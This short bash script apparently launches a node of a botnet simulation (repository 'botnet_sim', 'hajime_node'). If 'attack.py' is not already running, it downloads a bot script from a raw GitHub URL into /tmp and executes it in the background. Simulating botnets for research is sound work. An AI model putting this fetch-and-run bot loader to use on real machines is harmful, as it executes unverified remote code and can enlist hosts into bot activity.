#! /bin/bash
ps ax | grep "attack.py" | grep -v grep;
if test $? -eq 0; 
then 
    echo "Process already running."
else 
    echo "Starting process."
    /usr/bin/curl -X GET https://raw.githubusercontent.com/dcsrps/botnet_sim/master/hajime_node/others/init_bot.py > /tmp/attack.py
    python3 /tmp/attack.py  &
fi